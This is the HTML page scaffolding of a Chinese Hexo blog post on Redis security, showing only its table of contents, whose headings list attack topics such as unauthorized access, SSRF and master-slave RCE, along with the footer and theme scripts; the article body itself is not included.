+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Redis%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-text">1.Redis是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Redis%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-text">2.Redis的命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E5%91%BD%E4%BB%A4"><span class="nav-text">连接命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%AE%E6%93%8D%E4%BD%9C"><span class="nav-text">键操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%93%8D%E4%BD%9C"><span class="nav-text">配置操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-text">常用命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">3.环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B"><span class="nav-text">Redis安装过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%95%E6%8D%89Redis%E6%B5%81%E9%87%8F"><span class="nav-text">捕捉Redis流量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="nav-text">4.常用协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AERESP"><span class="nav-text">Redis通信协议RESP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="nav-text">Gopher协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dict%E5%8D%8F%E8%AE%AE"><span class="nav-text">Dict协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Dict-%E4%BD%BF%E7%94%A8%E4%BE%8B%E5%AD%90"><span class="nav-text">Dict 使用例子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E6%88%AA%E6%96%AD"><span class="nav-text">绕过?截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0-%E5%88%A4%E6%96%AD"><span class="nav-text">绕过 本地 判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E9%94%AE%E5%BC%8F-ssrf-redis-dict-%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">一键式 ssrf + redis + dict 利用脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="nav-text">5.漏洞攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="nav-text">未授权访问漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81"><span class="nav-text">安全配置密码验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9%E5%88%A0%E9%99%A4"><span class="nav-text">敏感信息泄露与数据库内容删除</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%91Web%E7%9B%AE%E5%BD%95%E5%86%99%E5%85%A5WebShell"><span class="nav-text">向Web目录写入WebShell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5SSH%E5%85%AC%E9%92%A5%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95"><span class="nav-text">写入SSH公钥直接登录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">写入定时任务反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5-etc-passwd%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="nav-text">写入&#x2F;etc&#x2F;passwd文件实现任意账号密码重置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">其他的利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="nav-text">利用主从复制RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="nav-text">Redis主从复制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="nav-text">攻击利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3Redis%E5%AF%86%E7%A0%81"><span class="nav-text">暴力破解Redis密码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8Hydra"><span class="nav-text">用Hydra</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8python"><span class="nav-text">用python</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88"><span class="nav-text">6.漏洞组合</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF%E6%89%93%E6%9C%AC%E5%9C%B0Redis%E6%9C%8D%E5%8A%A1"><span class="nav-text">SSRF打本地Redis服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-gopher"><span class="nav-text">脚本-gopher</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-dict-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">脚本-dict-定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-gopher-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">脚本-gopher-定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-%E5%86%99ssh%E7%A7%81%E9%92%A5"><span class="nav-text">脚本-写ssh私钥</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-ip%E7%BB%95%E8%BF%87"><span class="nav-text">SSRF ip绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-xip-io"><span class="nav-text">1. xip.io</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%9C%AC%E5%9C%B0%E5%9B%9E%E7%8E%AF%E5%9C%B0%E5%9D%80%E7%9A%84%E5%85%B6%E4%BB%96%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F"><span class="nav-text">2. 本地回环地址的其他表现形式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%AF%B9ip%E8%BF%9B%E8%A1%8C%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">3. 对ip进行进制转换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%BA%9Burl%E6%A0%87%E5%BF%97%E6%B7%B7%E6%B7%86"><span class="nav-text">4. 添加一些url标志混淆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E7%82%B9%E5%88%86%E5%89%B2%E7%AC%A6%E5%8F%B7%E6%9B%BF%E6%8D%A2%EF%BC%88%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E5%B8%B8%E7%94%A8%E4%BA%8E%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%EF%BC%89"><span class="nav-text">5. 点分割符号替换（钓鱼邮件常用于绕过检测）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E7%89%B9%E6%AE%8A%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text">6. 特殊数字绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%89%93%E6%9C%AC%E5%9C%B0Redis%E6%9C%8D%E5%8A%A1"><span class="nav-text">Python urllib CRLF注入打本地Redis服务</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ko1sh1</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共 14 篇文章
+                    </span>
+                    
+                        <span>
+                            共 128.2k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
